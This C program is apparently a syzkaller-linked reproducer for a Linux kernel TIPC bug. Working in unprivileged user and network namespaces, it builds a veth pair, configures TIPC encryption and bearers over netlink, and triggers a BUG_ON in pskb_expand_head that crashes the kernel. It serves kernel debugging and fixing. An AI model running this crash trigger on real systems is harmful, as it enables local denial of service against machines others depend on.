// https://syzkaller.appspot.com/bug?id=b80bd357592ee23c10d485b6b5ce543ae5186b45
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <errno.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/rtnetlink.h>
#include <linux/genetlink.h>
#include <linux/veth.h>
#include <linux/tipc.h>
#include <linux/tipc_netlink.h>

#ifndef ETH_P_TIPC
#define ETH_P_TIPC 0x88CA
#endif

#ifndef TIPC_GENL_V2_NAME
#define TIPC_GENL_V2_NAME "TIPCv2"
#endif

#ifndef NLA_F_NESTED
#define NLA_F_NESTED (1 << 15)
#endif

static int add_attr(struct nlmsghdr *n, int maxlen, int type, const void *data, int alen) {
    int len = RTA_LENGTH(alen);
    if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
        printf("[-] add_attr: buffer overflow\n");
        exit(1);
    }
    struct rtattr *rta = (struct rtattr *)(((char *)n) + NLMSG_ALIGN(n->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = len;
    if (alen > 0 && data)
        memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
    return 0;
}

static struct rtattr *start_nest(struct nlmsghdr *n, int maxlen, int type) {
    struct rtattr *nest = (struct rtattr *)(((char *)n) + NLMSG_ALIGN(n->nlmsg_len));
    add_attr(n, maxlen, type | NLA_F_NESTED, NULL, 0);
    return nest;
}

static void end_nest(struct nlmsghdr *n, struct rtattr *nest) {
    nest->rta_len = (char *)n + NLMSG_ALIGN(n->nlmsg_len) - (char *)nest;
}

static int nl_send_cmd_ack(int nlfd, struct nlmsghdr *n, const char *cmd_name) {
    struct sockaddr_nl sa;
    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;

    ssize_t sres = sendto(nlfd, n, n->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa));
    if (sres < 0) {
        printf("[-] Failed sendto in %s: %s\n", cmd_name, strerror(errno));
        exit(1);
    }

    char buf[4096];
    ssize_t len = recv(nlfd, buf, sizeof(buf), 0);
    if (len < 0) {
        printf("[-] Failed recv in %s: %s\n", cmd_name, strerror(errno));
        exit(1);
    }

    for (struct nlmsghdr *h = (struct nlmsghdr *)buf; NLMSG_OK(h, (size_t)len); h = NLMSG_NEXT(h, len)) {
        if (h->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);
            if (err->error != 0) {
                int ec = err->error < 0 ? -err->error : err->error;
                printf("[-] %s returned netlink error %d: %s\n", cmd_name, err->error, strerror(ec));
                exit(1);
            }
            printf("[+] %s netlink ACK (success).\n", cmd_name);
            return 0;
        }
    }
    printf("[+] %s completed successfully.\n", cmd_name);
    return 0;
}

static void create_veth_pair(const char *v1, const char *v2) {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) {
        printf("[-] Failed socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE): %s\n", strerror(errno));
        exit(1);
    }

    char buf[1024];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *n = (struct nlmsghdr *)buf;
    n->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    n->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
    n->nlmsg_type = RTM_NEWLINK;
    n->nlmsg_seq = 1;

    struct ifinfomsg *ifi = (struct ifinfomsg *)NLMSG_DATA(n);
    ifi->ifi_family = AF_UNSPEC;

    add_attr(n, sizeof(buf), IFLA_IFNAME, v1, strlen(v1) + 1);

    struct rtattr *linkinfo = start_nest(n, sizeof(buf), IFLA_LINKINFO);
    add_attr(n, sizeof(buf), IFLA_INFO_KIND, "veth", strlen("veth") + 1);

    struct rtattr *infodata = start_nest(n, sizeof(buf), IFLA_INFO_DATA);
    struct rtattr *peer = start_nest(n, sizeof(buf), VETH_INFO_PEER);

    struct ifinfomsg peer_ifi;
    memset(&peer_ifi, 0, sizeof(peer_ifi));
    peer_ifi.ifi_family = AF_UNSPEC;
    if (NLMSG_ALIGN(n->nlmsg_len) + sizeof(peer_ifi) > sizeof(buf)) {
        printf("[-] Buffer overflow for peer_ifi\n");
        exit(1);
    }
    memcpy((char *)n + NLMSG_ALIGN(n->nlmsg_len), &peer_ifi, sizeof(peer_ifi));
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + sizeof(peer_ifi);

    add_attr(n, sizeof(buf), IFLA_IFNAME, v2, strlen(v2) + 1);

    end_nest(n, peer);
    end_nest(n, infodata);
    end_nest(n, linkinfo);

    nl_send_cmd_ack(fd, n, "RTM_NEWLINK veth pair");
    int cres = close(fd);
    if (cres < 0) {
        printf("[-] Failed close(nl_rt): %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Created veth pair (%s <-> %s) successfully.\n", v1, v2);
}

static void set_link_up(const char *name) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        printf("[-] Failed socket(AF_INET, SOCK_DGRAM, 0): %s\n", strerror(errno));
        exit(1);
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
    int res = ioctl(s, SIOCGIFFLAGS, &ifr);
    if (res < 0) {
        printf("[-] Failed ioctl(SIOCGIFFLAGS) for %s: %s\n", name, strerror(errno));
        exit(1);
    }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    res = ioctl(s, SIOCSIFFLAGS, &ifr);
    if (res < 0) {
        printf("[-] Failed ioctl(SIOCSIFFLAGS) for %s: %s\n", name, strerror(errno));
        exit(1);
    }
    res = close(s);
    if (res < 0) {
        printf("[-] Failed close(s): %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Interface %s brought UP successfully.\n", name);
}

static int genl_get_family_id(int nlfd, const char *family) {
    char buf[512];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *n = (struct nlmsghdr *)buf;
    n->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    n->nlmsg_flags = NLM_F_REQUEST;
    n->nlmsg_type = GENL_ID_CTRL;
    n->nlmsg_seq = 1;

    struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(n);
    gh->cmd = CTRL_CMD_GETFAMILY;
    gh->version = 1;

    add_attr(n, sizeof(buf), CTRL_ATTR_FAMILY_NAME, family, strlen(family) + 1);

    struct sockaddr_nl sa;
    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;

    ssize_t sres = sendto(nlfd, n, n->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa));
    if (sres < 0) {
        printf("[-] Failed sendto in genl_get_family_id: %s\n", strerror(errno));
        exit(1);
    }

    char grcv[4096];
    ssize_t rlen = recv(nlfd, grcv, sizeof(grcv), 0);
    if (rlen < 0) {
        printf("[-] Failed recv in genl_get_family_id: %s\n", strerror(errno));
        exit(1);
    }

    for (struct nlmsghdr *h = (struct nlmsghdr *)grcv; NLMSG_OK(h, (size_t)rlen); h = NLMSG_NEXT(h, rlen)) {
        if (h->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);
            int ec = err->error < 0 ? -err->error : err->error;
            printf("[-] CTRL_CMD_GETFAMILY returned error: %s\n", strerror(ec));
            exit(1);
        }
        if (h->nlmsg_type == GENL_ID_CTRL) {
            int rtalen = h->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);
            struct rtattr *rta = (struct rtattr *)((char *)NLMSG_DATA(h) + GENL_HDRLEN);
            for (; RTA_OK(rta, rtalen); rta = RTA_NEXT(rta, rtalen)) {
                if (rta->rta_type == CTRL_ATTR_FAMILY_ID) {
                    return *(uint16_t *)RTA_DATA(rta);
                }
            }
        }
    }
    return -1;
}

static void tipc_cmd_net_set(int nlfd, int family_id, uint32_t addr) {
    char buf[512];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *n = (struct nlmsghdr *)buf;
    n->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    n->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    n->nlmsg_type = family_id;

    struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(n);
    gh->cmd = TIPC_NL_NET_SET;
    gh->version = 1;

    uint64_t w0 = 0x0102030405060708ULL;
    uint64_t w1 = 0x090a0b0c0d0e0f10ULL;

    struct rtattr *net_nest = start_nest(n, sizeof(buf), TIPC_NLA_NET);
    add_attr(n, sizeof(buf), TIPC_NLA_NET_ADDR, &addr, sizeof(addr));
    add_attr(n, sizeof(buf), TIPC_NLA_NET_NODEID, &w0, sizeof(w0));
    add_attr(n, sizeof(buf), TIPC_NLA_NET_NODEID_W1, &w1, sizeof(w1));
    end_nest(n, net_nest);

    nl_send_cmd_ack(nlfd, n, "TIPC_NL_NET_SET");
}

static void tipc_cmd_key_set(int nlfd, int family_id) {
    char buf[512];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *n = (struct nlmsghdr *)buf;
    n->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    n->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    n->nlmsg_type = family_id;

    struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(n);
    gh->cmd = TIPC_NL_KEY_SET;
    gh->version = 1;

    struct tipc_aead_key key_hdr;
    memset(&key_hdr, 0, sizeof(key_hdr));
    strncpy(key_hdr.alg_name, "gcm(aes)", sizeof(key_hdr.alg_name) - 1);
    key_hdr.keylen = 20; /* 16-byte key + 4-byte salt */

    char raw_key[sizeof(struct tipc_aead_key) + 20];
    memcpy(raw_key, &key_hdr, sizeof(key_hdr));
    memset(raw_key + sizeof(key_hdr), 0x5a, 20);

    struct rtattr *node_nest = start_nest(n, sizeof(buf), TIPC_NLA_NODE);
    add_attr(n, sizeof(buf), TIPC_NLA_NODE_KEY, raw_key, sizeof(raw_key));
    end_nest(n, node_nest);

    nl_send_cmd_ack(nlfd, n, "TIPC_NL_KEY_SET");
}

static void tipc_cmd_bearer_enable(int nlfd, int family_id, const char *bearer_name) {
    char buf[512];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *n = (struct nlmsghdr *)buf;
    n->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    n->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    n->nlmsg_type = family_id;

    struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(n);
    gh->cmd = TIPC_NL_BEARER_ENABLE;
    gh->version = 1;

    struct rtattr *bearer_nest = start_nest(n, sizeof(buf), TIPC_NLA_BEARER);
    add_attr(n, sizeof(buf), TIPC_NLA_BEARER_NAME, bearer_name, strlen(bearer_name) + 1);
    end_nest(n, bearer_nest);

    nl_send_cmd_ack(nlfd, n, "TIPC_NL_BEARER_ENABLE");
}

static int setup_packet_socket(const char *ifname) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_TIPC));
    if (fd < 0) {
        printf("[-] Failed socket(AF_PACKET, SOCK_RAW, htons(ETH_P_TIPC)): %s\n", strerror(errno));
        exit(1);
    }
    unsigned int ifindex = if_nametoindex(ifname);
    if (ifindex == 0) {
        printf("[-] Failed if_nametoindex(%s): %s\n", ifname, strerror(errno));
        exit(1);
    }
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_TIPC);
    sll.sll_ifindex = ifindex;
    int res = bind(fd, (struct sockaddr *)&sll, sizeof(sll));
    if (res < 0) {
        printf("[-] Failed bind(AF_PACKET) to %s: %s\n", ifname, strerror(errno));
        exit(1);
    }
    printf("[+] AF_PACKET socket bound to %s (ETH_P_TIPC) successfully.\n", ifname);
    return fd;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Starting TIPC pskb_expand_head bug reproducer...\n");

    /* 1. Enter isolated network & user namespaces */
    int res = unshare(CLONE_NEWUSER | CLONE_NEWNET);
    if (res < 0) {
        printf("[-] Failed unshare(CLONE_NEWUSER | CLONE_NEWNET): %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] unshare(CLONE_NEWUSER | CLONE_NEWNET) successful.\n");

    /* 2. Setup veth pair */
    create_veth_pair("veth0", "veth1");
    set_link_up("veth0");
    set_link_up("veth1");

    /* 3. Pre-register AF_PACKET hooks before bearer enable */
    int pfd1_0 = setup_packet_socket("veth0");
    int pfd1_1 = setup_packet_socket("veth1");
    (void)pfd1_0;
    (void)pfd1_1;

    /* 4. Open generic netlink socket & resolve TIPCv2 family ID */
    int genl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (genl_fd < 0) {
        printf("[-] Failed socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC): %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC) successful.\n");

    int family_id = genl_get_family_id(genl_fd, TIPC_GENL_V2_NAME);
    if (family_id < 0) {
        printf("[-] TIPCv2 family not found\n");
        exit(1);
    }
    printf("[+] Resolved TIPCv2 Generic Netlink family ID: %d\n", family_id);

    /* 5. Initialize node address AND node identity */
    tipc_cmd_net_set(genl_fd, family_id, 0x01001001);

    /* 6. Install cluster AEAD key */
    tipc_cmd_key_set(genl_fd, family_id);

    /* 7. Enable bearer on veth0 */
    tipc_cmd_bearer_enable(genl_fd, family_id, "eth:veth0");

    /* 8. Post-register AF_PACKET hooks after veth0 bearer */
    int pfd2_0 = setup_packet_socket("veth0");
    int pfd2_1 = setup_packet_socket("veth1");
    (void)pfd2_0;
    (void)pfd2_1;

    /* 9. Enable bearer on veth1: transmits encrypted discovery broadcast
     * out veth1 into veth0, triggering deliver_skb with skb->users == 2,
     * leading to skb_cow_data() -> pskb_expand_head() -> BUG_ON(skb_shared(skb))
     */
    printf("[*] Enabling bearer on veth1 to trigger bug...\n");
    tipc_cmd_bearer_enable(genl_fd, family_id, "eth:veth1");

    /* 10. Wait for any async/softirq execution if not crashed synchronously */
    printf("[*] Bearers enabled, waiting for packet processing...\n");
    sleep(1);

    printf("[+] Program completed.\n");
    return 0;
}
